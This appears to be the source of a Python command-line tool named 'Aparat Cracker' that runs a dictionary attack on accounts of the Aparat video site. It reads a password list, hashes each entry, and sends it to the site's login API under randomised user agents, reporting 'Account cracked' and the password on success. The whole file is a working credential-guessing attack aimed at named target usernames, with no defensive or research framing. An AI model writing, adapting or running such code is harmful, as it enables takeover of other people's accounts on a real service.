import httpx
import hashlib
import fake_useragent
import rich.table
import BufferArgv
import time
import rich
import os
import sys

os.system("")
print("\033[00m", end="")

class AparatEncryption(object):
    def __init__(
            self,
            password: str
    ) -> None:
        self.password = str(password) if not isinstance(password, str) else password
        self.key = self.master(self.sec(self.password))

    def master(self, sec_key: str = ""):
        sha1 = hashlib.sha1()
        sha1.update(sec_key.encode())
        return sha1.hexdigest()
    
    def sec(self, key: str = ""):
        md5 = hashlib.md5()
        md5.update(key.encode())
        return md5.hexdigest()

class AparatClient(object):
    def __init__(
            self
    ) -> None:
        self.url = "https://www.aparat.com/etc/api/"
        self.fua = fake_useragent.FakeUserAgent()
        self.cli = httpx.Client()
        self.time_out = httpx.USE_CLIENT_DEFAULT
        self.encryption = AparatEncryption

    def login(
            self,
            username: str,
            password: str,
            timeout: int = -999
    ) -> dict:
        
        enc_key = self.encryption(password)
        prepared_url = self.url + "login/luser/" + username + "/lpass/" + enc_key.key
        prepared_header = { "User-Agent": self.fua.random }

        try:
            result = self.cli.get(prepared_url, headers=prepared_header, timeout=timeout if timeout != -999 else self.time_out)
            result = result.json()
            result['opratc_err'] = False
            result['password'] = password
            result['key'] = enc_key.key
            return result
        except Exception as Error_Aparat:
            return {"opratc_err": True, "message": str(Error_Aparat),
                    "password": password, "key": enc_key.key}

class Opratc(object):
    def __init__(self) -> None:
        pass

    def log(self, msg: str) -> None:
        ontime = time.strftime("%H:%M:%S")
        print(f"[\033[92m+\033[00m]-[\033[93m{ontime}\033[00m]> {msg}")
    
    def err(self, msg: str) -> None:
        ontime = time.strftime("%H:%M:%S")
        print(f"[\033[91m-\033[00m]-[\033[93m{ontime}\033[00m]> {msg}")

    def isHumanReadable(self, file_path):
        try:
            with open(file_path, 'r') as file:
                content = file.read()
                return all(ord(char) < 128 for char in content)
        except UnicodeDecodeError:
            return False

buffer = BufferArgv.BufferConsole()
console = rich.console.Console()
client = AparatClient()
opratc = Opratc()

console.log("Software Homepage https://github.com/Rubier-Project/Opratc")
console.print()

@buffer.addFlag("-t", "--timeout", obj_type="number")
def onTimeout(to_obj: BufferArgv.Things):
    if to_obj.t == "NONECALL" and to_obj.timeout == "NONECALL":
        to_obj.t = "DEFAULT"
        to_obj.timeout = "DEFAULT"
    else:
        time_outed = to_obj.t if to_obj.t != "NONECALL" or to_obj.t != "" and type(to_obj.t) == int else to_obj.timeout if to_obj.timeout != "NONECALL" or to_obj.timeout != "" and type(to_obj.timeout) == int  else "DEFAULT"
        if time_outed in ("Null", "NONECALL"):
            to_obj.t = "DEFAULT"
            to_obj.timeout = "DEFAULT"
        else:
            to_obj.t = time_outed
            to_obj.timeout = time_outed

@buffer.addFlag("-o", "--open")
def onFile(file_obj: BufferArgv.Things):
    if file_obj.o == "NONECALL" and file_obj.open == "NONECALL":
        if "-h" in sys.argv or "--help" in sys.argv:pass
        else:
            opratc.log("Flag \033[92m'-o'\033[00m | \033[92m'--open'\033[00m not found")
            exit(1)

    else:
        path = "Null"

        if not file_obj.o in ("Null", "NONECALL", ""):
            path = file_obj.o 
        
        elif not file_obj.open in ("Null", "NONECALL", ""):
            path = file_obj.open
        
        else:
            opratc.err("Path is not found")
            exit(1)

        if path in ("Null", "NONECALL"):
            opratc.err("Path is not found")
            exit(1)

        elif not os.path.exists(path):
            opratc.err("Path does not exist")
            exit(1)

        elif not os.path.isfile(path):
            opratc.err("Path is not a file")
            exit(1)

        elif not opratc.isHumanReadable(path):
            opratc.err("Path is not human readable")
            exit(1)
        
        else:
            content = open(path, 'r').read()
            if content.count("\n") == 0:
                opratc.err("File has invalid content")
                exit(1)

            else:splitted =  content.split("\n");setattr(file_obj, "password_list", splitted);opratc.log(f"\033[93m{len(splitted) - 1}\033[00m Password added")

@buffer.addFlag("-u", "--username")
def onUsername(user_obj: BufferArgv.Things):
    if user_obj.u == "NONECALL" and user_obj.username == "NONECALL":
        if "-h" in sys.argv or "--help" in sys.argv:pass
        else:
            opratc.err("Flag \033[92m'-u'\033[00m | \033[92m'--username'\033[00m not found")
            exit(1)
    
    else:
        username = "Null"

        if not user_obj.u in ("Null", "NONECALL", ""):
            username = user_obj.u 
        
        elif not user_obj.username in ("Null", "NONECALL", ""):
            username = user_obj.username
        
        else:
            opratc.err("Path is not found")
            exit(1)
        if username in ("Null", "NONECALL"):
            opratc.err("Username was not set or not found")
            exit(1)
        else:
            opratc.log(f"Username Seted: \033[92m'{username}'\033[00m")
            timed = user_obj.t if not user_obj.t == "DEFAULT" else -999

            for password in user_obj.password_list:
                res = client.login(
                    username,
                    password,
                    timed
                )
                if res['opratc_err']:
                    opratc.err(f"Error for {username}:{password} ( \033[92m{res['message']}\033[00m )")
                elif res['login']['type'] == "success":
                    opratc.log("Account cracked")
                    opratc.log(f"Key ( Password ): {password}")
                    opratc.log(f"Hash Key: \033[92m'{res['key']}'\033[00m")
                    rich.print(res['login'])
                    exit(1)
                else:
                    opratc.err(f"\033[91m'{password}'\033[00m")

@buffer.addFlag("-h", "--help", mode="on_call")
def onHelp(obj: BufferArgv.Things):
    if obj.h == True or obj.help == True:
        console.print("[bold] Aparat Cracker [/bold] :spider:", justify="center")
        console.print()

        table = rich.table.Table.grid(padding=1, pad_edge=True)
        table.add_column("Arguments", no_wrap=True,
                         justify="left", style="bold")
        table.add_column("Description")

        table.add_row("-h, --help", "[green]Print this message[/green]")
        table.add_row("-t, --timeout [cyan]<TIMEOUT>[/cyan]", "Set Timeout ( [purple]Optional[/purple] )")
        table.add_row("-o, --open [cyan]<FILEPATH>[/cyan]", "Open Password list File ( [purple]Necessary[/purple] )")
        table.add_row("-u, --username [cyan]<USERNAME>[/cyan]", "Select the Target Username ( [purple]Necessary[/purple] )")
        console.print(table)

buffer.setFilter([
    "-h", "--help",
    "-t", "--timeout",
    "-o", "--open",
    "-u", "--username"
], err_message=f"[\033[91m-\033[00m]-[\033[93m{time.strftime('%H:%M:%S')}\033[00m]> Invalid argument: B@ARGV")
buffer.trust()
